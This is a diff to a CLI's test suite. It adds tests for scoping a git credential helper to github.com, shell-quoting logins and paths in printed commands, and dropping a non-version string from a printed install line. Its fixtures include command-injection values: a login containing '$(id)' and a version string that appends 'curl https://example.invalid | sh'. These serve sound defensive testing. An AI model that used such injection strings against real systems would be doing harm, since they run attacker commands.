@@ -4004,8 +4004,12 @@ describe("setting a machine up for an agent account (ADR-0088)", () => {
     // The token reaches git through the environment alone, and git asks nobody at a terminal.
     expect(clone?.env?.CONSOLE_DESK_TOKEN).toBe("not-a-real-token-51c2");
     expect(clone?.env?.GIT_TERMINAL_PROMPT).toBe("0");
-    expect(clone?.env?.GIT_CONFIG_KEY_1).toBe("credential.helper");
+    // The helper that answers with it is named for the remote's own origin, and no other host's.
+    expect(clone?.env?.GIT_CONFIG_KEY_0).toBe("credential.https://github.com.helper");
+    expect(clone?.env?.GIT_CONFIG_VALUE_0).toBe("");
+    expect(clone?.env?.GIT_CONFIG_KEY_1).toBe("credential.https://github.com.helper");
     expect(clone?.env?.GIT_CONFIG_VALUE_1).toContain("$CONSOLE_DESK_TOKEN");
+    expect(Object.keys(clone?.env ?? {})).not.toContain("credential.helper");
     expect(JSON.stringify(clone?.args)).not.toContain("not-a-real-token");
     expect(clone?.env?.GIT_CONFIG_VALUE_1).not.toContain("not-a-real-token");
     expect(run.out()).toContain(
@@ -4086,6 +4090,33 @@ describe("setting a machine up for an agent account (ADR-0088)", () => {
     expect(without.out()).toContain("No service is written, as asked.");
     expect(asked.files.has(UNIT)).toBe(false);
     expect(asked.runs).toEqual([]);
+
+    // A login a shell would read as more than a word is quoted in the line a person runs, as
+    // is a desk with a space in its name: on Windows as PowerShell takes one.
+    const odd = { ...MIRA, person: { ...MIRA.person, login: "mi;ra$(id)@acme.example" } };
+    const quoted = fakeMachine();
+    const posix = harness({
+      fetch: consoleOf({ "GET /api/v1/me": { body: odd } }).fetch,
+      machine: quoted.machine,
+      store: memoryStore(KEPT).store,
+    });
+    expect(
+      await runCli([...LINE, "--no-service", "--desk", "/Users/mira/the desk"], posix.io),
+    ).toBe(EXIT.ok);
+    expect(posix.out()).toContain(
+      `cd '/Users/mira/the desk' && console runner --url ${ORIGIN} --account 'mi;ra$(id)@acme.example'\n`,
+    );
+    const windows = harness({
+      fetch: consoleOf({
+        "GET /api/v1/me": {
+          body: { ...odd, person: { ...odd.person, login: "o'mira@acme.example" } },
+        },
+      }).fetch,
+      machine: fakeMachine({ platform: "win32" }).machine,
+      store: memoryStore(KEPT).store,
+    });
+    expect(await runCli([...LINE, "--no-service"], windows.io)).toBe(EXIT.ok);
+    expect(windows.out()).toContain("--account 'o''mira@acme.example'\n");
 
     // The unit is written and the system would not load it: its own words, and what to look at.
     const unloaded = fakeMachine({
@@ -4553,6 +4584,19 @@ describe("the versions of the command and the console (ADR-0025)", () => {
     });
     expect(await runCli(["tasks"], unsaid.io)).toBe(EXIT.incompatible);
     expect(unsaid.err()).toContain("npm install -g @skillcdn/console@latest");
+    // What a console says its version is goes into a line someone runs: anything that is no
+    // version is not put there.
+    const odd = harness({
+      fetch: fakeConsole(refused("client.outdated", "Old."), {
+        version: "0.1.18; curl https://example.invalid | sh",
+        clientRange: ">=0.1.18 <0.2.0",
+      }).fetch,
+      env: SIGNED_IN,
+      version: "0.1.17",
+    });
+    expect(await runCli(["tasks"], odd.io)).toBe(EXIT.incompatible);
+    expect(odd.err()).toContain("npm install -g @skillcdn/console@latest");
+    expect(odd.err()).not.toContain("npm install -g @skillcdn/console@0.1.18;");
   });
 
   it("still reads a console older than the rule, and says that it does not say its version", async () => {
